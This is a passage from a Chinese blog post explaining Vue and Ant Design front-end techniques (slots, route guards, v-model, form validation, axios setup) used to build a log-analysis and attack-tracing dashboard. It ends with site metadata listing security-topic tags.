&lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; 文件上传 &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; 数据分析 &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; 日志分析 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; 获取报告 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;立体数据&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; 攻击溯源 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; 实时监控 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;系统设置&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;登出&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;是否确定登出？&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- 上面是在导航栏最顶端加东西 --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design ©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; 需要注意的是： 1&lt;slot&gt;&lt;/slot&gt; 在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//在下面导入，之后再html当中使用即可components:&#123; menus, &#125;, 6.路由守卫我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的： 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, 这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。 7.期待值这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下： 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;报告生成&lt;/a-button&gt; （通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.设置默认值有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法： 123mounted() &#123; // this.drawChart(); &#125; 以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子： 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.实现监听数据在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果， 例如我们可以构造如下代码： 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;//在JS代码中：selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。 10.监听的妙用利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如： 123456789101112&lt;!-- 用户名判断 --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; 顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况 在methods当中，我们构造如下代码： 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, 在data当中： 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, 官方是如下解释的： v-decorator 是 Ant Design 的控件验证属性。 经过 getFieldDecorator 或 v-decorator 包装的控件，表单控件会自动添加 value（或 valuePropName 指定的其他属性） onChange（或 trigger 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果： 你不再需要也不应该用 onChange 来做同步，但还是可以继续监听 onChange 等事件。 你不能用控件的 value defaultValue 等属性来设置表单域的值，默认值可以用 getFieldDecorator 或 v-decorator 里的 initialValue。 你不应该用 v-model，可以使用 this.form.setFieldsValue 来动态改变表单值。 也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式 11.v-model的妙用在html当中写下： 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;输入key，即可自动溯源&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; 注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造： 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, 而当我们点击按钮发送数据之后： 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可 axios part1.aiox发送数据axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可： 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true 例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下： 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;账号或密码错误！&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() 在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了 总结感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Laravel","slug":"Laravel","permalink":"http://example.com/tags/Laravel/"},{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"JSON","slug":"JSON","permalink":"http://example.com/tags/JSON/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/tags/NodeJs/"},{"name":"[object Object]","slug":"object-Object","permalink":"http://example.com/tags/object-Object/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://example.com/tags/ThinkPHP/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"原型链污染","slug":"原型链污染","permalink":"http://example.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Javascirpt","slug":"Javascirpt","permalink":"http://example.com/tags/Javascirpt/"},{"name":"vm2沙箱逃逸","slug":"vm2沙箱逃逸","permalink":"http://example.com/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"XXE","slug":"XXE","permalink":"http://example.com/tags/XXE/"},{"name":"AWD","slug":"AWD","permalink":"http://example.com/tags/AWD/"},{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]}